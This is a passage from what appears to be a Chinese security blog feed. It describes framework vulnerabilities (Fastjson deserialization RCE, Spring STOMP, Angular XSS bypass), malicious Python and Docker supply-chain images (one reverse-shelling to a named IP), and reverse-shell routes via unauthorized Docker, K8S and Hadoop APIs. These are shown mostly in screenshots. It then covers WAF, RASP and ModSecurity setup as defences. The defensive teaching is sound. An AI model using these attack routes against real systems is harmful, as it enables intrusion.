应用系统开发过程中，会使用一些开源的前端、后端框架，来实现快速、规范开发。在选用实际的框架时，需对框架进行安全评估，以防止出现安全漏洞，把一些不需要安全风险引入到业务系统中。</p><img src="/2019/04/14/develop-secure-web-application/develop_framework_summary.png"><h4 id="开源框架漏洞"><a href="#开源框架漏洞" class="headerlink" title="开源框架漏洞"></a>开源框架漏洞</h4><blockquote><p>针对开源框架，需要业务实际使用需求，及时检查框架是否是漏洞版本，若框架版本存在漏洞，及时将框架升级到最新无漏洞版；同时在使用框架时，需要定义一些安全编码规范，避免由于框架配置导致目标框架存在漏洞。</p></blockquote><h5 id="SPRING-后端框架漏洞"><a href="#SPRING-后端框架漏洞" class="headerlink" title="SPRING 后端框架漏洞"></a>SPRING 后端框架漏洞</h5><blockquote><p>2018年4月5日，Pivotal Spring 官方发布安全公告，Spring 中存在三个安全漏洞。CVE-2018-1270 漏洞是指 Spring 框架中通过 spring-messaging 模块来实现 STOMP（Simple Text-Orientated Messaging Protocol），STOMP 是一种封装 WebSocket 的简单消息协议。攻击者可以通过建立 WebSocket 连接并发送一条消息造成远程代码执行。</p></blockquote><p>如下图所示，启动 Spring STOMP 服务</p><img src="/2019/04/14/develop-secure-web-application/framework_spring_demo.png"><p>Spring 使用了 STOMP 功能模块，导致服务器可远程执行命令，如下所示</p><img src="/2019/04/14/develop-secure-web-application/framework_spring_rce.png"><h5 id="ANGULAR-前端框架漏洞"><a href="#ANGULAR-前端框架漏洞" class="headerlink" title="ANGULAR 前端框架漏洞"></a>ANGULAR 前端框架漏洞</h5><p>ANGULAR 前端框架已经做了较好的安全防护，但若使用过程中，误用了某些功能，则可能导致自身业务系统存在安全漏洞。官方文档中提出了一些安全建议</p><ul><li>及时把 Angular 包更新到最新版本</li><li>不要修改你的 Angular 版本</li><li>谨慎使用不安全的方法，以下几个方法分别与 XSS 防护中的几个输出检查方法相对应<ul><li>bypassSecurityTrustHtml</li><li>bypassSecurityTrustScript</li><li>bypassSecurityTrustStyle</li><li>bypassSecurityTrustUrl</li><li>bypassSecurityTrustResourceUrl</li></ul></li><li>不在服务端拼接模版语言</li></ul><p><strong> 误用不安全的 bypass 方法 </strong><br>如下，<code>this.dangerousUrl</code> 在渲染过程会被 Angular 自动安全转义，<code>this.trustedUrl</code> 开发人员在代码实现过程中过于信任其安全性，直接在页面 HTML 中渲染调用 bypassSecurity 方法</p><img src="/2019/04/14/develop-secure-web-application/angular_url_escape_url.png"><p>渲染的页面源码如下所示</p><img src="/2019/04/14/develop-secure-web-application/angular_url_escape_url_show.png"><p><code>this.dangerousUrl</code> 在页面中被自动安全转义未触发 XSS 漏洞</p><img src="/2019/04/14/develop-secure-web-application/angular_url_secure_encode.png"><p><code>this.trustedUrl</code> 开发人员调用了 bypassSecurity 方法，导致渲染的前端页面存在 XSS 漏洞</p><img src="/2019/04/14/develop-secure-web-application/angular_url_bypass.png"><h4 id="JAVA-反序列化执行"><a href="#JAVA-反序列化执行" class="headerlink" title="JAVA 反序列化执行"></a>JAVA 反序列化执行</h4><h5 id="JAVA-序列化及反序列化"><a href="#JAVA-序列化及反序列化" class="headerlink" title="JAVA 序列化及反序列化"></a>JAVA 序列化及反序列化</h5><p>如下图所示，JAVA 代码中定义了 Person 类，其通过 Fastjson 框架实现了序列化及反序列化两个操作</p><ul><li>序列化，将 person java object 对象转化成字符串</li><li>反序列化，将字符串转化成 personObj java object对象</li></ul><img src="/2019/04/14/develop-secure-web-application/java_deserialization_demo.png"><p>参考 Person 类序列化及反序列化思路，重新创建一个 Poc 类，实现在 Java 代码中初始化时执行弹出计算器的命令，代码如下图所示</p><img src="/2019/04/14/develop-secure-web-application/java_deserialization_poc_class.png"><p>初始化 Poc 对象时，触发命令执行，弹出计算器</p><img src="/2019/04/14/develop-secure-web-application/java_deserialization_poc_class_new.png"><blockquote><p>上述代码在初始化 Poc 类时，可指定弹出计算器命令，如果将 Poc 在内存中的 Java Object 对象序列化成字符串，然后再执行反序列化操作，能够成功执行弹出计算器命令？答案是可以的！！！！</p></blockquote><h5 id="JAVA-反序列化-RCE"><a href="#JAVA-反序列化-RCE" class="headerlink" title="JAVA 反序列化 RCE"></a>JAVA 反序列化 RCE</h5><p>JAVA 反序列化代码如下所示，其代码逻辑为</p><ul><li>编译 Poc 代码，输出到 Poc.class 文件</li><li>读取 Poc.class 文件内容，通过 TemplatesImpl 类构造反序列化所需的字符串</li><li>调用 Fastjson 反序列化</li></ul><img src="/2019/04/14/develop-secure-web-application/java_deserialization_rce.png"><p>在 Fastjson 反序列化恶意构造字符串时，执行了在 Poc 初始化函数中所定义的命令（弹出计算器）</p><img src="/2019/04/14/develop-secure-web-application/java_deserialization_rce_show.png"><h5 id="反序列化-RCE-JAR-包"><a href="#反序列化-RCE-JAR-包" class="headerlink" title="反序列化 RCE JAR 包"></a>反序列化 RCE JAR 包</h5><blockquote><p>2017年3月15日，Fastjson 官方主动爆出 Fastjson 在1.2.24及之前版本存在远程代码执行高危安全漏洞，攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。</p></blockquote><p>以上代码测试模拟的是 Fastjson 框架反序列化 RCE 漏洞，除了 Fastjson 还有大量的 Java Jar 第三方包都存在反序列化漏洞，如下图所示</p><img src="/2019/04/14/develop-secure-web-application/java_deserialization_jars.png"><p>如下为利用 Apache Common Collection 反序列化漏洞反弹 Shell 的利用截图</p><img src="/2019/04/14/develop-secure-web-application/java_deserialization_apache_common_collection_rce.png"><h4 id="框架漏洞检测"><a href="#框架漏洞检测" class="headerlink" title="框架漏洞检测"></a>框架漏洞检测</h4><p>Java 框架漏洞检测可使用 OWASP 的 dependency-check 工具，使用其检测上述 Fastjson 项目如下图所示</p><img src="/2019/04/14/develop-secure-web-application/java_dependency_check_cli.png"><p>应用依赖包检测报告中指出 <code>fastjson-1.2.24.jar</code> 存在严重安全漏洞</p><img src="/2019/04/14/develop-secure-web-application/java_dependency_check_report.png"><p>安全漏洞编号为 CVE-2017-18349 ，允许攻击者通过发送恶意的 JSON，当应用通过 Fastjson 反序列化字符串时，可远程执行命令</p><img src="/2019/04/14/develop-secure-web-application/java_dependency_check_details.png"><h3 id="供应链安全"><a href="#供应链安全" class="headerlink" title="供应链安全"></a>供应链安全</h3><p>软件供应链是指在企业应用系统开发、应用系统交付、应用系统形成的一个整体的链结构。</p><ul><li>应用系统开发，软硬件环境、开发工具、第三方库、软件开发实施过程，包括需求分析、设计、实现和测试等，软件产品在应用系统开发环节形成最终用户可用的形态</li><li>应用系统交付，用户通过在线商店、免费网络下载、购买软件安装存储介质、资源共享等方式获取软件产品过程</li><li>应用系统形成，使用软件产品的整个生命周期，包括软件升级、维护等过程</li></ul><p>由于在一个灰色的软件供应链中，上游开发者总是在处心积虑引入恶意代码，企业在系统研发、测试、运营过程需关注供应链各个环节安全风险。在研发编码过程中，需建立一个可信的开发环境包括</p><ul><li>不无条件大量信任第三方包、框架与源，外部基础组件，由于外部组件、第三方包等其在开发、分发环节存在被攻破篡改的风险</li><li>在二次开发和定制的基础组件过程中，需注意二次开发不止可能引入碎片化、历史漏洞问题，还可能让代码失去一致性安全保证</li><li>明确 Ctrl-C 和 Ctrl-V 引入的外部威胁，由 GitHub 等公开代码借鉴而来的情况在开发实践中不可避免，如果存在蓄意发布的暗藏恶意的代码可能被直接引入</li><li>避免大量人员流动，快速迭代中人员流动，一方面不利于代码规范的维持，一方面也引入了“人”本身的不确定因素</li></ul><h4 id="不安全的-PYTHON-依赖库"><a href="#不安全的-PYTHON-依赖库" class="headerlink" title="不安全的 PYTHON 依赖库"></a>不安全的 PYTHON 依赖库</h4><p>如下图所示，通过引入恶意的 string 库，在库 import 过程，会直接输出 <code>Test hook in current path</code></p><img src="/2019/04/14/develop-secure-web-application/evil_python_lib.png"><p>如下为引入恶意 python 库的某业务 Web 应用系统，只要攻击者请求 <code>?cmd=</code> 即可直接在 Web 服务器执行任意命令</p><img src="/2019/04/14/develop-secure-web-application/evil_python_lib_show.png"><h4 id="不安全的-DOCKER-镜像"><a href="#不安全的-DOCKER-镜像" class="headerlink" title="不安全的 DOCKER 镜像"></a>不安全的 DOCKER 镜像</h4><p>2017 年 5 月，DockerHub（Docker 官方镜像仓库）用户 docker123321 注册成功，并相继创建了多个恶意 Docker 镜像</p><img src="/2019/04/14/develop-secure-web-application/evil_docker_image.png"><p>恶意 Docker Tomcat 镜像如下图所示，在 Docker 启动后其会触发一个 Shell 反弹至 98.142.140.13 的 8888 端口</p><img src="/2019/04/14/develop-secure-web-application/evil_docker_shell.png"><h4 id="供应链攻击案例"><a href="#供应链攻击案例" class="headerlink" title="供应链攻击案例"></a>供应链攻击案例</h4><p>在 360 威胁情报文章 “ <a href="https://mp.weixin.qq.com/s/If_Q0BlIZTiYp_7d1zJMWw" target="_blank" rel="noopener">软件供应链来源攻击分析报告</a> ” 中，披露了在软件开发环节、交付环节、使用环节多个攻击场景及案例。</p><h2 id="部署配置漏洞"><a href="#部署配置漏洞" class="headerlink" title="部署配置漏洞"></a>部署配置漏洞</h2><img src="/2019/04/14/develop-secure-web-application/unsafe_operation_configuration.png"><p>常见的配置漏洞如上图所示，弱口令或空口令等部分部署配置漏洞在上文漏洞介绍已经有进行了针对性介绍及利用，下文将主要介绍几个未授权访问漏洞</p><h3 id="Docker-未授权访问"><a href="#Docker-未授权访问" class="headerlink" title="Docker 未授权访问"></a>Docker 未授权访问</h3><blockquote><p>Docker daemon 默认是监听在 unix socket 上的，如 <code>unix:///var/run/docker.sock</code>，官方还提供一个 Rustful Api 接口，允许通过 TCP 远程访问 Docker。可通过执行以下<code>dockerd -H=0.0.0.0:2375 -H unix:///var/run/docker.sock</code> 让 Docker 监听在本地所有地址的 2375 端口上。</p></blockquote><p>如下扫描发现 <code>172.17.0.1</code> 开放端口 2375 端口为 Docker Remote Api 端口</p><img src="/2019/04/14/develop-secure-web-application/unauth_docker_remote_api_port.png"><p>通过 Docker Remote Api 查看目标宿主机有什么镜像、运行容器</p><img src="/2019/04/14/develop-secure-web-application/unauth_docker_remote_image_json.png"><p>创建容器，设置容器启动命令为反弹 Shell 命令</p><img src="/2019/04/14/develop-secure-web-application/unauth_docker_getshell.png"><p>反弹获取 Docker 宿主机 Shell</p><img src="/2019/04/14/develop-secure-web-application/unauth_docker_getshell_show.png"><h3 id="K8S-未授权访问"><a href="#K8S-未授权访问" class="headerlink" title="K8S 未授权访问"></a>K8S 未授权访问</h3><blockquote><p>K8S（Kubernetes） 是一个跨主机集群的 开源的容器调度平台，它可以自动化应用容器的部署、扩展和操作 , 提供以容器为中心的基础架构。</p></blockquote><p>K8S 在创建应用页面可指定创建 Docker 容器所能使用的命令，如下图所示，可将宿主机根目录挂载至 Docker 容器中，通过在宿主机定时任务目录下写入定时任务，来 GetShell</p><img src="/2019/04/14/develop-secure-web-application/unauth_k8s_new_container.png"><p>同样也可直接通过 YAML 文件指定 K8S 容器配置，如下所示</p><img src="/2019/04/14/develop-secure-web-application/unauth_k8s_getshell_configuration.png"><h3 id="Hadoop-未授权访问"><a href="#Hadoop-未授权访问" class="headerlink" title="Hadoop 未授权访问"></a>Hadoop 未授权访问</h3><blockquote><p>Hadoop Yarn 提供有默认开放在 8088 和 8090 的 REST API（默认前者）允许用户直接通过 API 进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API 将会开放在公网导致未授权访问。</p></blockquote><img src="/2019/04/14/develop-secure-web-application/unauth_hadoop_page.png"><p>如下图通过构建 workcount 测试用例，在测试用例中将 Hadoop Yarn Shell 反弹</p><img src="/2019/04/14/develop-secure-web-application/unauth_hadoop_getshell.png"><p>如下图所示为成功反弹 GetShell</p><img src="/2019/04/14/develop-secure-web-application/unauth_hadoop_getshell_show.png"><h2 id="漏洞安全防护"><a href="#漏洞安全防护" class="headerlink" title="漏洞安全防护"></a>漏洞安全防护</h2><p>关于 Web 应用系统安全防护，目前开源方案较多的是 WAF（Web Application Firewall） 和 RASP（Runtime Application Self-Protection），如下图所示</p><ul><li>WAF，门卫模型，通常根据用户请求数据来进行攻击检测，开源项目有代表性的为 <a href="https://modsecurity.org/" target="_blank" rel="noopener">ModSecurity</a></li><li>RASP，管家模型，通常根据处理响应 Web 应用请求后与系统、数据库等相关交互行为特征来进行攻击检测，开源项目有代表性的为 <a href="https://rasp.baidu.com/" target="_blank" rel="noopener">百度 RASP</a></li></ul><img src="/2019/04/14/develop-secure-web-application/web_application_protect.png"><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><blockquote><p>WAF，门卫模型，通常部署在 Web 应用系统的外部边界，所有正常或恶意流量都需要通过特征规则和模式识别，WAF 拒绝向高风险的 Web 请求提供服务。WAF 特征规则和模式需要频繁、及时升级，但通常仍存在误报率高、更新不及时问题。</p></blockquote><img src="/2019/04/14/develop-secure-web-application/web_waf.png"><h4 id="WAF-防御原理"><a href="#WAF-防御原理" class="headerlink" title="WAF 防御原理"></a>WAF 防御原理</h4><p>后面介绍的 WAF 防护原理介绍都是通过 ModSecurity WAF 来开展的，文章中 ModSecurity WAF 使用攻击评分模式，即当入站或出站超过设定的阈值，则拒绝为攻击用户提供服务。如下图为正常请求时 Web 应用系统响应的内容</p><img src="/2019/04/14/develop-secure-web-application/waf_welcome.png"><p>如下图所示，当用户请求 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，用户收到的响应与上图正常请求不同，即已经被识别成攻击行为而拒绝提供服务。</p><img src="/2019/04/14/develop-secure-web-application/waf_xss_forbidden.png"><p>根据 ModSecurity WAF 日志可以看出该 HTTP 请求入站请求的风险评分过高，导致请求被拒绝服务</p><img src="/2019/04/14/develop-secure-web-application/waf_xss_forbidden_summary.png"><p>在下图中可以看出，其连续触犯了多条 XSS 检测规则</p><img src="/2019/04/14/develop-secure-web-application/waf_xss_forbidden_details.png"><p>ModSecurity WAF 在进行安全防护时会从下图所示的几个属性进行风险评估，包括</p><ul><li>HTTP 请求参数、Header、UA、请求 Body 等</li><li>HTTP 响应内容等</li></ul><img src="/2019/04/14/develop-secure-web-application/waf_http_part_protect.png"><h4 id="WAF-规则编写"><a href="#WAF-规则编写" class="headerlink" title="WAF 规则编写"></a>WAF 规则编写</h4><p>“假装”测试 Fastjson 反序列化 RCE 请求（后端应用反序列化操作未实现，所以响应的为 404），未添加 Fastjson 防护规则的 ModSecurity 无法阻止此攻击请求，如下图所示</p><img src="/2019/04/14/develop-secure-web-application/waf_fastjson_without_protect.png"><p>新增 Fastjson 防护规则 932140，如下图所示，即检查请求参数中是否包含 <code>@type</code> 字段，若存在，则判定为攻击行为</p><img src="/2019/04/14/develop-secure-web-application/waf_fastjson_protect_rule.png"><p>新增防护规则后的 ModSecurity 防护成功，目标请求被拒绝服务</p><img src="/2019/04/14/develop-secure-web-application/waf_fastjson_protect.png"><p>查看 ModSecurity 防护日志，其入站请求安全风险值太高，被拒绝服务</p><img src="/2019/04/14/develop-secure-web-application/waf_fastjson_protect_summary.png"><p>分析更具体的拦截请求，发现攻击请求被新增的 932140（上述操作添加的防护规则） 拦截成功</p><img src="/2019/04/14/develop-secure-web-application/waf_fastjson_protect_details.png"><h3 id="RASP"><a href="#RASP" class="headerlink" title="RASP"></a>RASP</h3><blockquote><p>RASP，管家模型，一种新型应用安全防护技术，直接将防护引擎嵌入到应用内部，能够感知应用上下文；其在执行层面分析敏感函数是否被调用，在应用程序内部基于调用栈调用检测模型阻断攻击，误报率相对较低、绕过难度也较大。</p></blockquote><img src="/2019/04/14/develop-secure-web-application/web_rasp.png"><p>如下图所示，在一个普通 Java 程序（带有 main 函数的 Java 类）运行时，通过 <code>–javaagent</code> 参数指定一个特定的 jar 文件（包含 Instrumentation 代理）来启动 Instrumentation 的代理程序，动态修改 Java 代码插入攻击检测功能逻辑代码。</p><img src="/2019/04/14/develop-secure-web-application/rasp_run_steps.png"><p>指定 应用启动时加载 javaopenrasp.jar javaagent 应用</p><img src="/2019/04/14/develop-secure-web-application/rasp_show.png"><p>如下所示，为相关检测模块输出及拦截日志</p><img src="/2019/04/14/develop-secure-web-application/rasp_show_details.png"><h4 id="RASP-防御原理"><a href="#RASP-防御原理" class="headerlink" title="RASP 防御原理"></a>RASP 防御原理</h4><p>在 premain 模块中，读取 RASP 配置文件，增加 transformer 插桩</p><img src="/2019/04/14/develop-secure-web-application/rasp_code_premain.png"><p>根据配置文件中的所配置的 Hook 类，增加 Hook 代码</p><img src="/2019/04/14/develop-secure-web-application/rasp_code_transform.png"><p>修改 Hook 的类，增加 RASP 过滤、检测模块</p><img src="/2019/04/14/develop-secure-web-application/rasp_code_visit.png"><p>过滤、检测模块支持拦截、白名单、黑名单、记录模式</p><img src="/2019/04/14/develop-secure-web-application/rasp_code_filter.png"><img src="/2019/04/14/develop-secure-web-application/rasp_code_filter_rule.png"><p>使用如上所示防护配置后，RASP 防护拦截日志如下所示，Fastjson RCE 操作被成功拦击，实现 “0day” 级别的安全防护</p><img src="/2019/04/14/develop-secure-web-application/rasp_protect_show.png"><h1 id="Web-安全过程"><a href="#Web-安全过程" class="headerlink" title="Web 安全过程"></a>Web 安全过程</h1><p>Web 安全过程需要在 Web 开发过程各环节中结合 Web 应用防御中介绍的风险点，进行持续、迭代评估，降低目标 Web 系统的风险面，提高整体项目的安全基线，增大攻击门槛。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;p&gt;Web 应用系统从设计、开发到上线、运营是一个较为复杂的过程，通常包含需求分析、架构设计、系统设计、功能设计、编码实现、测试评估、上线部署、业务运营等关键步骤。本文将简化部分 Web 系统开发相关流程，主要从功能设计、编码测试、发布部署、系统运营四个
      
    
    </summary>
    
      <category term="安全建设" scheme="https://l0gs.xf0rk.space/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="安全建设" scheme="https://l0gs.xf0rk.space/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
      <category term="安全开发" scheme="https://l0gs.xf0rk.space/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>安全建设之 WAF 防御</title>
    <link href="https://l0gs.xf0rk.space/2018/12/21/step-into-modsecurity/"/>
    <id>https://l0gs.xf0rk.space/2018/12/21/step-into-modsecurity/</id>
    <published>2018-12-21T14:39:10.000Z</published>
    <updated>2019-04-14T15:40:51.475Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>WAF (Web Application Firewall)，Web 应用防火墙，通过解析 HTTP/HTTPS 请求内容，并执行一系列的安全检测策略，对目标 Web 应用提供安全防护，同时记录相关安全防御日志。文章将介绍 ModSecurity 相关部署配置概念、防御规则及简单地定制化实践。</p></blockquote><h2 id="WAF-概念简述"><a href="#WAF-概念简述" class="headerlink" title="WAF 概念简述"></a>WAF 概念简述</h2><p>WAF 根据产品形态不同，通常可以分为硬件设备类、软件产品类及云 WAF 类别，相关产品代表如下</p><ul><li>硬件设备类，如绿盟、安恒、启明星辰等厂商生产的 WAF；</li><li>软件产品类，如 <code>ModSecurity</code> 、网站安全狗等；</li><li>云 WAF，如阿里云盾、知道创宇加速乐等；</li></ul><p>根据工作原理不同可分为反向代理模式、云 AGENT 模式及容器安全模块形式</p><table><thead><tr><th style="text-align:left">工作模式</th><th style="text-align:left">工作原理</th><th style="text-align:left">优劣分析</th></tr></thead><tbody><tr><td style="text-align:left">反向代理模式</td><td style="text-align:left">修改DNS，让域名解析到反向代理服务器。所有流量经过反向代理进行检测，检测无问题之后再转发给后端的Web服务器</td><td style="text-align:left">集中式流量出入口，可针对大数据分析，动态添加一层，增加网络开销，站点后端 Web 较多的情况，转发规则比较复杂，流量都被捕捉，涉及敏感数据需要保护</td></tr><tr><td style="text-align:left">云 AGENT 模式</td><td style="text-align:left">所有请求通过 Web 服务器模块转发到云端进行安全检测，NGINX 根据云端检测结果进行转发，若检测为攻击则执行配置的动作</td><td style="text-align:left">安全规则统一管理，规则更新只需要更新后端的决策系统，不涉及 Web 服务器端规则更新，根据业务配置规则，需要较高成本，Web 服务器变更时不便于更新</td></tr><tr><td style="text-align:left">容器安全模块</td><td style="text-align:left">所有请求流量均先经过检测引擎的检测，若未发现攻击，则进行正常业务响应，否则按照配置的动作进行响应</td><td style="text-align:left">网络结构简单，仅部署容器安全模块，但维护困难，大规模服务器集群，任何更新涉及多台服务器，需部署操作，成本高，无集中化数据中心，安全事件汇总不方便</td></tr></tbody></table><h2 id="ModSecurity-部署"><a href="#ModSecurity-部署" class="headerlink" title="ModSecurity 部署"></a>ModSecurity 部署</h2><blockquote><p><code>Nginx</code> 加载 <code>ModSecurity</code> 模块安装有两种方式：一种是编译为 <code>Nginx</code> 静态模块，另一种是通过 <code>ModSecurity-Nginx Connector</code> 加载动态模块，下面将实践 <code>ModSecurity-Nginx Connector</code> 动态模块的安装和配置</p></blockquote><p>安装编译 <code>libmodsecurity</code> 依赖库</p><pre><code>yum install -y pt-utils autoconf automake build-essential git libcurl4-openssl-dev libgeoip-dev liblmdb-dev libpcre++-dev libtool libxml2-dev libyajl-dev pkgconf wget zlib1g-dev doxygen libxml2-devel pcre-devel</code></pre><h3 id="编译-libmodsecurity-模块"><a href="#编译-libmodsecurity-模块" class="headerlink" title="编译 libmodsecurity 模块"></a>编译 libmodsecurity 模块</h3><p>下载 <code>libmodsecurity</code> 源码并编译模块</p><pre><code>git clone --depth 1 -b v3/master --single-branch https://github.com/SpiderLabs/ModSecuritycd ModSecuritygit submodule initgit submodule update./build.sh./configuremakemake install</code></pre><blockquote><p>若编译安装过程出现如下错误提示，可直接忽略</p><pre><code>fatal: No names found, cannot describe anything.</code></pre></blockquote><h3 id="编译-nginx-connector-模块"><a href="#编译-nginx-connector-模块" class="headerlink" title="编译 nginx connector 模块"></a>编译 nginx connector 模块</h3><p>下载 <code>nginx connector</code> 模块，并编译成动态模块</p><pre><code>git clone --depth 1 https://github.com/SpiderLabs/ModSecurity-nginx.git</code></pre><blockquote><p>目标机器已安装 <code>Nginx</code> ，需确认 <code>Nginx</code> 版本，并下载指定版本的 <code>Nginx</code> 源码进行编译，否则可下载任意版本 <code>Nginx</code> 源码进行编译</p></blockquote><p>下载 <code>Nginx</code> 源码进行编译，编译过程加入 <code>ModSecurity</code> 依赖库模块</p><pre><code>wget http://nginx.org/download/nginx-1.14.1.tar.gztar zxvf nginx-1.14.1.tar.gzcd nginx-1.14.1./configure --add-dynamic-module=../ModSecurity-nginxmake modules</code></pre><blockquote><p>网上部分文档编译过程 <code>configure</code> 添加编译参数 <code>--with-compat</code> 启用模块兼容性，导致编译后的 <code>so</code> 模块无法使用(错误提示如下)，去除该选项即可</p><pre><code>nginx: [emerg] module &quot;/usr/local/nginx/conf/modules/ngx_http_modsecurity_module.so&quot; is not binary compatible in /usr/local/nginx/conf/nginx.conf:11</code></pre></blockquote><p>将编译成功的 ModSecurity 模块复制到 Nginx 安装目录中，在 Nginx 配置文件中添加如下配置，加载 ModSecurity 模块</p><pre><code>load_module modules/ngx_http_modsecurity_module.so;</code></pre><h3 id="配置-ModSecurity-规则"><a href="#配置-ModSecurity-规则" class="headerlink" title="配置 ModSecurity 规则"></a>配置 ModSecurity 规则</h3><p>下载 <code>ModSecurity</code> 配置规则</p><pre><code>mkdir modseucirtywget -P xxx/modsecurity/ https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/modsecurity.conf-recommendedmv xxx/modsecurity/modsecurity.conf-recommended xxx/modsecurity/modsecurity.conf</code></pre><blockquote><p>在对 <code>ModSecurity</code> 进行配置时，需要将原 <code>ModSecurity</code> 文件夹中的 <code>unicode.mapping</code> 复制到与上述 <code>modsecurity.conf</code> 文件相同的文件夹中，否则启动 <code>Nginx</code> 过程会提示文件缺失，如下所示</p><pre><code>nginx: [emerg] &quot;modsecurity_rules_file&quot; directive Rules error. File: /usr/local/nginx/conf/modsec/modsecurity.conf. Line: 236. Column: 17. Failed to locate the unicode map file from: unicode.mapping Looking at: &#39;unicode.mapping&#39;, &#39;unicode.mapping&#39;, &#39;/usr/local/nginx/conf/modsec/unicode.mapping&#39;, &#39;/usr/local/nginx/conf/modsec/unicode.mapping&#39;.  in /usr/local/nginx/conf/nginx.conf:41</code></pre></blockquote><p>修改 <code>ModSecurity</code> 配置文件 <code>modsecurity.conf</code> 中检测模式 <code>SecRuleEngine DetectionOnly</code> 为 <code>SecRuleEngine On</code>，如下图所示</p><pre><code># -- Rule engine initialization ----------------------------------------------# Enable ModSecurity, attaching it to every transaction. Use detection# only to start with, because that minimises the chances of post-installation# disruption.##SecRuleEngine DetectionOnlySecRuleEngine On</code></pre><p>在 <code>Nginx</code> <code>Server</code> 配置中开启 <code>ModSecurity</code> 配置，如下所示</p><pre><code>nginx.conf 配置文件server {    listen       80;    server_name  localhost;    modsecurity on;    modsecurity_rules_file /usr/local/nginx/conf/modsec/main.conf;    location / {        root   html;        index  index.html index.htm;    }    error_page   500 502 503 504  /50x.html;    location = /50x.html {        root   html;    }}----------------------------------------------------------------------------------------------main.conf 配置文件Include &quot;/usr/local/nginx/conf/modsec/modsecurity.conf&quot;# 添加测试规则，当请求中包含参数 testparam 同时其值为 test 时，拦截请求并返回 403SecRule ARGS:testparam &quot;@contains test&quot; &quot;id:1234,deny,status:403&quot;</code></pre><h3 id="ModSecurity-规则测试"><a href="#ModSecurity-规则测试" class="headerlink" title="ModSecurity 规则测试"></a>ModSecurity 规则测试</h3><p><code>ModSecurity</code> 规则测试如下图所示，当携带参数 <code>?testparam=test</code> 发起请求时，请求被拒绝</p><img src="/2018/12/21/step-into-modsecurity/modsecurity_testparam_demo.png"><h2 id="ModSecurity-配置简介"><a href="#ModSecurity-配置简介" class="headerlink" title="ModSecurity 配置简介"></a>ModSecurity 配置简介</h2><h3 id="ModSecurity-日志配置"><a href="#ModSecurity-日志配置" class="headerlink" title="ModSecurity 日志配置"></a>ModSecurity 日志配置</h3><p><code>ModSecurity</code> 应用中的日志包括 <code>Debug</code>（调试日志）、<code>Audit</code>（审计日志）两大类，调试日志记录 <code>ModSecurity</code> 规则匹配、检测过程，并依据调试日志相关参数的不同，其所记录的日志字段均不同，调试日志配置如下所示</p><table><thead><tr><th style="text-align:left">调试日志配置</th><th style="text-align:left">参数说明</th></tr></thead><tbody><tr><td style="text-align:left">SecDebugLog</td><td style="text-align:left">调试日志记录路径</td></tr><tr><td style="text-align:left">SecDebugLogLevel</td><td style="text-align:left">调试日志记录等级</td></tr></tbody></table><p>调试日志记录等级分为 7 个等级，如下所示</p><ul><li>0 不输出日志</li><li>1 输出错误日志，例如致命的处理错误、阻塞的会话</li><li>2 记录警告日志，例如非阻塞的规则匹配</li><li>3 输出通知日志，例如非致命的处理错误</li><li>4 信息</li><li>5 详情</li><li>9 输出所有调试日志</li></ul><p>审计日志，可用于输出所有 HTTP 会话日志，其日志数据如下所示</p><table><thead><tr><th style="text-align:left">日志属性</th><th style="text-align:left">参数说明</th></tr></thead><tbody><tr><td style="text-align:left">SecAuditEngine</td><td style="text-align:left">控制审计日志输出，其可选值为 On、Off、RelevantOnly</td></tr><tr><td style="text-align:left">SecAuditLogRelevantStatus</td><td style="text-align:left">待审计的 HTTP 状态码，例如 ^(?:5&#124;4(?!04)) 用于过滤 5xx 或 4xx，排除 404</td></tr><tr><td style="text-align:left">SecAuditLogParts</td><td style="text-align:left">ABCDEFGHIJKZ 所需记录的 HTTP 请求字段</td></tr><tr><td style="text-align:left">SecAuditLogType</td><td style="text-align:left">审计日志类型，可选值为 Serial、Concurrent</td></tr><tr><td style="text-align:left">SecAuditLog</td><td style="text-align:left">记录审计日志路径</td></tr><tr><td style="text-align:left">SecAuditLogStorageDir</td><td style="text-align:left">Concurrent 审计日志时所输出的目录</td></tr></tbody></table><p><code>SecAuditLogParts</code> 取值为 <code>ABCDEFGHIJKZ</code> 说明如下所示</p><table><thead><tr><th style="text-align:center">日志属性</th><th style="text-align:left">参数说明</th></tr></thead><tbody><tr><td style="text-align:center">A</td><td style="text-align:left">审计日志头</td></tr><tr><td style="text-align:center">B</td><td style="text-align:left">请求头</td></tr><tr><td style="text-align:center">C</td><td style="text-align:left">请求 Body</td></tr><tr><td style="text-align:center">D</td><td style="text-align:left">保留</td></tr><tr><td style="text-align:center">E</td><td style="text-align:left">响应 Body</td></tr><tr><td style="text-align:center">F</td><td style="text-align:left">响应头</td></tr><tr><td style="text-align:center">G</td><td style="text-align:left">保留</td></tr><tr><td style="text-align:center">H</td><td style="text-align:left">审计标记，包含额外审计会话数据</td></tr><tr><td style="text-align:center">I</td><td style="text-align:left">保留</td></tr><tr><td style="text-align:center">J</td><td style="text-align:left">保留</td></tr><tr><td style="text-align:center">K</td><td style="text-align:left">所匹配的规则集合</td></tr><tr><td style="text-align:center">Z</td><td style="text-align:left">终结标记</td></tr></tbody></table><p>如下为一段审计日志示例</p><pre><code>---Xd59KAAO---A--[26/Nov/2018:09:46:59 +0800] 154319681942.596956 10.211.55.2 58760 10.211.55.2 80---Xd59KAAO---B--GET /?testparam=test HTTP/1.1Host: 10.211.55.14Connection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7If-None-Match: &quot;5bf974af-264&quot;If-Modified-Since: Sat, 24 Nov 2018 15:56:31 GMT---Xd59KAAO---C-----Xd59KAAO---D-----Xd59KAAO---E--&lt;html&gt;\x0d\x0a&lt;head&gt;&lt;title&gt;403 